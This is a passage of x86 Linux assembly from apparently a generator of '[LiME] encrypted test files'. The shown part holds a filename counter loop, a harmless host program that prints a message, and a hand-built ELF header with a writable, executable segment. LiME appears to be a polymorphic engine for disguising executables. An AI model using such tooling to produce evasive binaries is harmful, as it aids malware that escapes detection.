        inc byte [ebx+1]
        cmp byte [ebx+1],'9'
        jbe gen_l2
        inc byte [ebx]
        mov byte [ebx+1],'0'
gen_l2:
        pop ecx
        loop gen_l1

        mov eax,1
        xor ebx,ebx
        int 80h
        
gen_msg db 'Generates 50 [LiME] encrypted test files...',0dh,0ah
gen_msg_len equ $-gen_msg

host:
        call host_reloc
host_reloc:
        pop ecx
        add ecx,host_msg-host_reloc
        mov eax,4
        mov ebx,1
        mov edx,host_msg_len
        int 80h
        mov eax,1
        xor ebx,ebx
        int 80h

host_msg db 'This is a [LiME] test file! ...('
filename db 't00',0
	 db ')',0dh,0ah
host_msg_len equ $-host_msg
host_len equ $-host

elf_head:
e_ident db 7fh,'ELF',1,1,1
        times 9 db 0
e_type  dw 2
e_mach  dw 3
e_ver   dd 1
e_entry dd host_entry-elf_head+08049000h
e_phoff dd 34h
e_shoff dd 0
e_flags dd 0
e_elfhs dw 34h
e_phes  dw 20h
e_phec  dw 01h
e_shes  dw 0
e_shec  dw 0
e_shsn  dw 0    
elf_ph:
p_type  dd 1
p_off   dd 0
p_vaddr dd 08049000h
p_paddr dd 08049000h
p_filsz dd file_len
p_memsz dd file_len
p_flags dd 7
p_align dd 1000h
        times 20h db 0
host_entry:
        times 1024*4 db 0

file_len equ $-elf_head

